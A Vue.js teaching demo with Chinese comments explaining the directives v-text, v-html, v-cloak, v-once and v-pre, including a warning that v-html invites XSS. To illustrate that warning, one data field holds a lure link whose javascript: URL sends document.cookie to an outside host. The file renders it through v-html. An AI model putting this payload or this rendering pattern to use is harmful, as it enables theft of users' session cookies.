<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>demo</title>
</head>
<style>
    [v-cloak] {
        display: none;
    }
</style>
<script type="text/javascript" src="../js/vue.js"></script>

<body>
    <!-- @vue 指令 -->
    <!-- #region -->
    <!--    @ V-bind ：单向绑定解析表达式，可简写为:XXX
    @V-model : 双向数据绑定
    @V-for ：遍历数组/对象/字符串
    @V-on：绑定事件监听，可简写为@
    @V-if：条件渲染（动态控制节点是否存存在）
    @V-else ：条件渲染（动态控制节点是否存存在）
    @V-show ：条件渲染（动态控制节点是否展示） 
    -->
    <!-- @V-text指令：
            1.作用：向其所在的节点中渲染文本内容。
            2.与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。 
        @v-html指令：
            1.作用：向指定节点中渲染包含html结构的内容。
            2.插值语法的区别：
                (1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
                (2).v-html可以识别html结构。
            !3.严重注意：v-html有安全性问题！！！！
                (1).在网站上动态渲染任意HTML是非常危险的，容易导致xSS攻击。
                (2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
        @V-cloak指令（没有值）：
                1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
                2.使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。
                ![v-cloak] {display: none; }
        @V-once指令：
                1.V-once所在节点在初次动态渲染后，就视为静态内容了。
                2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。
        @V-pre指令：
                1.跳过其所在节点的编译过程。
                2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。
            -->

    <!-- #endregion -->
    <div id="app">
        <div>
            <h3>您好{{name}}</h3>
            <!-- 会替换里面的   不会解析标签-->
            <h3 v-text="str">您好</h3>
            <!-- 会替换里面的   会解析标签-->
            <h3 v-html="str">您好!</h3>
            <h3 v-html="str2">您好!</h3>
        </div>

        <!-- ?v-once -->
        <div>
            <!--@ 让初始的n值不变化 v-once  只读取一次 -->
            <h2 v-once>初始的n:{{n}}</h2>
            <h2>当前的n:{{n}}</h2>
            <button @click="n++">n++</button>
        </div>
        <!-- ?v-pre -->
        <div>
            <h2 v-pre>Vue真是个好东西</h2>
            <!-- {{n}}不解析 click也不解析 -->
            <h2 v-pre>当前的n:{{n}}</h2>
            <button v-pre click="n++">n++</button>
        </div>
    </div>
</body>
<script type="text/javascript">
    var vm = new Vue({
        el: "#app",
        data: {
            name: 'tom',
            str: '<h3>您好</h3>',
            // 可以获取网站cookie传递给服务器
            str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟有资源哦</a>',
            n: 1,
        },
        // 计算属性
        computed: {

        },
        // 方法函数
        methods: {

        },
        // vm.mount('#app')
    })
</script>

</html>
